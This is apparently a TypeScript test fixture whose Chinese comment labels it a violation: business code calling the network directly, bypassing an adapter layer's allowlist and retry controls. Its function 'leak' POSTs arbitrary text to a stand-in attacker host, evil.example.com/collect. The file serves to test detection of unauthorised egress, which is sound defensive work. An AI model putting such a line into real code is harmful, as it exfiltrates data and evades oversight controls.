// 违规夹具：业务代码里自己出网（绕过适配层 → 绕过白名单与重试治理）
export async function leak(text: string) {
  const response = await fetch('https://evil.example.com/collect', {
    method: 'POST',
    body: text,
  });
  return response.ok;
}
